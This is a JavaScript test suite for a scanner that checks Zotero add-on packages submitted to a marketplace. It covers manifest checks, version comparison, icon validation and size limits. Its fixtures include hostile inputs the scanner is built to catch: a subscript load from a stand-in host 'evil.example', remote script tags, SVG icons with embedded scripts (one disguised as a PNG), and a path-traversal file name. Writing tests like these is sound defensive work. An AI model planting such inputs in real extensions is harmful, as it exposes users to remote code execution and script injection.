import { test } from "node:test";
import assert from "node:assert/strict";
import { inspectXpi } from "../scripts/lib/inspect.mjs";
import { compareVersions, isCompatible } from "../scripts/lib/version.mjs";
import { config, listing, manifest, xpi, png } from "./helpers.mjs";

const codes = (result, level) => result.findings.filter((f) => !level || f.level === level).map((f) => f.code);

test("a plain extension passes with nothing to report", () => {
  const result = inspectXpi(xpi(), { listing: listing(), config });
  assert.equal(result.ok, true);
  assert.deepEqual(result.findings, []);
  assert.equal(result.version, "1.0.0");
  assert.equal(result.minAppVersion, "9.0");
  assert.equal(result.maxAppVersion, "11.*");
  // The smallest icon of at least 64px.
  assert.equal(result.icon.path, "icon-96.png");
  assert.equal(result.icon.type, "image/png");
});

test("the manifest must match the listing and point updates at the marketplace", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { id: "other@example.com", update_url: "https://example.com/u.json" } }) }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["id-mismatch", "update-url"]);
});

test("an extension without bootstrap.js or version bounds is rejected", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { strict_max_version: undefined } }), files: { "bootstrap.js": null } }),
    { listing: listing(), config },
  );
  assert.deepEqual(codes(result, "error").sort(), ["bootstrap-missing", "compat-missing"]);
});

test("code from the internet and obfuscated code are rejected", () => {
  const obfuscated = Array.from({ length: 30 }, (_, i) => `var _0x${(0xa000 + i).toString(16)}=1;`).join("");
  const result = inspectXpi(
    xpi({
      files: {
        "content/load.js": 'Services.scriptloader.loadSubScript("https://evil.example/x.js", this);',
        "content/page.xhtml": '<script src="https://cdn.example/lib.js"></script>',
        "content/o.js": obfuscated,
      },
    }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["obfuscated", "remote-code", "remote-code"]);
});

test("a script tag loading from the internet is found however it is written, and quickly", () => {
  const tags = [
    '<script type="module" src="https://cdn.example/lib.js"></script>',
    `<script data-pad="${"x".repeat(5000)}" SRC = 'http://cdn.example/lib.js'>`,
    '<script <script src="https://cdn.example/lib.js">',
  ];
  for (const tag of tags) {
    const result = inspectXpi(xpi({ files: { "content/page.html": tag } }), { listing: listing(), config });
    assert.deepEqual(codes(result, "error"), ["remote-code"], tag.slice(0, 40));
  }
  const local = '<script src="chrome://hello/content/a.js"></script><img src="https://example.com/a.png">';
  assert.equal(inspectXpi(xpi({ files: { "content/page.html": local } }), { listing: listing(), config }).ok, true);

  // A megabyte of "<script " with no ">" took a minute with a backtracking
  // pattern; the release fits easily in the size limit once deflated.
  const started = Date.now();
  const result = inspectXpi(xpi({ files: { "content/page.html": "<script ".repeat(128 * 1024) } }), {
    listing: listing(),
    config,
  });
  assert.equal(result.ok, true);
  assert.ok(Date.now() - started < 5000, `took ${Date.now() - started} ms`);
});

test("code too large to scan is refused without being read, and a broken archive stops the scan", () => {
  const huge = inspectXpi(xpi({ files: { "content/big.js": "a".repeat(9 * 1024 * 1024) } }), { listing: listing(), config });
  assert.deepEqual(codes(huge, "error"), ["file-too-large"]);

  // Two damaged files: the first stops the scan.
  const bytes = xpi({ files: { "content/a.js": "let a = 1;", "content/b.js": "let b = 2;" } });
  for (const text of ["let a = 1;", "let b = 2;"]) {
    bytes[bytes.indexOf(text)] ^= 1;
  }
  assert.deepEqual(codes(inspectXpi(bytes, { listing: listing(), config }), "error"), ["unreadable"]);
});

test("strict_min_version and strict_max_version must be short versions", () => {
  const check = (min, max) =>
    inspectXpi(xpi({ manifest: manifest({ zotero: { strict_min_version: min, strict_max_version: max } }) }), {
      listing: listing(),
      config,
    });
  for (const [min, max] of [["10.999", "11.*"], ["7.0a1", "11.0.*"], ["*", "*"]]) {
    assert.equal(check(min, max).ok, true, `${min} to ${max}`);
  }

  // Copied into the index and every update manifest, so a long one is refused
  // rather than published.
  const long = check("9.0", `11.${"0.".repeat(100000)}0`);
  assert.deepEqual(codes(long), ["compat-invalid"]);
  assert.equal(long.maxAppVersion, null);
  assert.ok(long.findings[0].message.length < 300);
  for (const [min, max] of [["11.x", "12.0"], ["9.0", "1234567890.0"], ["9.0", "11.* "]]) {
    assert.deepEqual(codes(check(min, max), "error"), ["compat-invalid"], `${min} to ${max}`);
  }
});

test("a version keeps a hundred web addresses and counts the rest", () => {
  const code = [
    ...Array.from({ length: 150 }, (_, i) => `fetch("https://h${String(i).padStart(3, "0")}.example.net/");`),
    // Longer than any host name can be
    `fetch("https://${"a".repeat(300)}.example.net/");`,
  ].join("\n");
  const result = inspectXpi(xpi({ files: { "content/a.js": code } }), { listing: listing(), config });
  assert.equal(result.ok, true);
  assert.equal(result.detected.hosts.length, 100);
  assert.equal(result.detected.hosts[0], "h000.example.net");
  assert.equal(result.detected.moreHosts, 50);
  // The notice still counts every one.
  assert.match(result.findings[0].message, / and 138 more\.$/);
});

test("findings are capped, and the file names they quote are cut short", () => {
  const name = (i) => `content/${"n".repeat(300)}${i}.js`;
  const files = Object.fromEntries(Array.from({ length: 60 }, (_, i) => [name(i), 'import("https://example.com/x.js");']));
  const result = inspectXpi(xpi({ files }), { listing: listing(), config });
  assert.equal(result.ok, false);
  assert.equal(result.findings.length, 50);
  assert.deepEqual(result.findings[49], { level: "error", code: "more-findings", message: "And 11 more findings, not listed." });
  assert.ok(result.findings.every((f) => f.message.length < 400));

  // Names the ZIP reader quotes too
  const unsafe = inspectXpi(xpi({ files: { [`../${"x".repeat(1000)}`]: "x" } }), { listing: listing(), config });
  assert.deepEqual(codes(unsafe), ["not-a-zip"]);
  assert.ok(unsafe.findings[0].message.length < 300);
});

const withIcons = (icons, files) =>
  inspectXpi(xpi({ manifest: manifest({ icons }), files }), { listing: listing(), config });

test("only PNG and JPEG icons are shown, and only when they are what they say", () => {
  // An SVG served from the marketplace's own address would run its scripts there
  const svgOnly = withIcons({ 96: "icon.svg" }, { "icon.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' });
  assert.equal(svgOnly.ok, true);
  assert.equal(svgOnly.icon, null);
  assert.deepEqual(codes(svgOnly), ["icon-format"]);

  // With a PNG beside it, the PNG is shown
  const both = withIcons({ 48: "icon.svg", 96: "icon-96.png" }, { "icon.svg": "<svg/>", "icon-96.png": png() });
  assert.equal(both.icon.path, "icon-96.png");
  assert.deepEqual(both.findings, []);

  const jpeg = withIcons({ 64: "icon.jpg" }, { "icon.jpg": Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2]) });
  assert.equal(jpeg.icon.type, "image/jpeg");

  // An SVG, or a page, named .png
  const disguised = withIcons({ 96: "icon.png" }, { "icon.png": "<svg><script>alert(1)</script></svg>" });
  assert.equal(disguised.icon, null);
  assert.deepEqual(codes(disguised), ["icon-format"]);
});

test("an icon over 512 KB is not read, and a missing one is noted", () => {
  const large = withIcons({ 96: "icon-96.png" }, { "icon-96.png": png("x".repeat(513 * 1024)) });
  assert.equal(large.icon, null);
  assert.deepEqual(codes(large), ["icon-too-large"]);

  const missing = withIcons({ 96: "gone.png" }, {});
  assert.deepEqual(codes(missing), ["icon-missing"]);
});

test("what the code uses is compared with what the listing declares", () => {
  const files = {
    "content/a.js": [
      "Services.cookies.getCookiesFromHost(h, {});",
      "Zotero.Utilities.Internal.copyTextToClipboard(t);",
      'fetch("https://api.example.com/v1");',
      'fetch("https://other.example.net/");',
      'el.setAttribute("xmlns", "http://www.w3.org/1999/xhtml");',
    ].join("\n"),
  };
  const undeclared = inspectXpi(xpi({ files }), { listing: listing(), config });
  assert.equal(undeclared.ok, true);
  assert.deepEqual(undeclared.detected.uses, ["clipboard", "cookies"]);
  assert.deepEqual(undeclared.detected.hosts, ["api.example.com", "other.example.net"]);
  assert.deepEqual(codes(undeclared, "warning").sort(), ["undeclared-clipboard", "undeclared-cookies"]);
  assert.deepEqual(codes(undeclared, "notice"), ["undeclared-hosts"]);

  const declared = inspectXpi(xpi({ files }), {
    listing: listing({ declares: { cookies: true, clipboard: true, network: ["example.com", "example.net"] } }),
    config,
  });
  assert.deepEqual(declared.findings, []);
});

test("sending content without a privacy policy is a warning", () => {
  const result = inspectXpi(xpi(), { listing: listing({ declares: { sendsContent: true } }), config });
  assert.deepEqual(codes(result), ["no-privacy-policy"]);
});

test("a version Paperly would refuse is listed with a warning", () => {
  const result = inspectXpi(xpi({ manifest: manifest({ zotero: { strict_max_version: "10.*" } }) }), {
    listing: listing(),
    config,
  });
  assert.equal(result.ok, true);
  assert.deepEqual(codes(result), ["incompatible"]);
});

test("oversized and broken files are refused before anything else", () => {
  assert.deepEqual(codes(inspectXpi(Buffer.alloc(config.maxXpiBytes + 1), { listing: listing(), config })), [
    "too-large",
  ]);
  assert.deepEqual(codes(inspectXpi(Buffer.from("x".repeat(100)), { listing: listing(), config })), ["not-a-zip"]);
  assert.deepEqual(codes(inspectXpi(xpi({ files: { "manifest.json": "{" } }), { listing: listing(), config })), [
    "manifest-invalid",
  ]);
});

test("versions compare the way the add-on manager compares them", () => {
  assert.equal(compareVersions("1.0", "1.0.0"), 0);
  assert.equal(compareVersions("1.0b2", "1.0"), -1);
  assert.equal(compareVersions("1.10", "1.9"), 1);
  assert.equal(compareVersions("11.0", "11.*"), -1);
  assert.equal(isCompatible("11.0", "9.0", "11.*"), true);
  assert.equal(isCompatible("11.0", "9.0", "10.*"), false);
  assert.equal(isCompatible("11.0", "11.1", "12.*"), false);
});

test("versions compare like Gecko's ParseVP in its corners", () => {
  // A "+" part is the next number's "pre".
  assert.equal(compareVersions("1.0+", "1.1pre"), 0);
  assert.equal(compareVersions("1.0+", "1.0"), 1);
  assert.equal(compareVersions("1.0+", "1.0.5"), 1);
  assert.equal(isCompatible("11.0", "9.0", "11.0+"), true);
  // The text part ends at a digit, "+" or "-", and the number after it may
  // carry a sign.
  assert.equal(compareVersions("1.0a+1", "1.0a1"), 0);
  assert.equal(compareVersions("1.0a-1", "1.0a"), -1);
  assert.equal(compareVersions("1.0a1x", "1.0a1"), -1);
  // Numbers outside int32 count as 0, and "*" is above every number.
  assert.equal(compareVersions("1.99999999999", "1.0"), 0);
  assert.equal(compareVersions("1.*", "1.999999999"), 1);
  // Missing parts and empty parts are 0.
  assert.equal(compareVersions("1.", "1.0.0"), 0);
  assert.equal(compareVersions("1..2", "1.0.2"), 0);
});
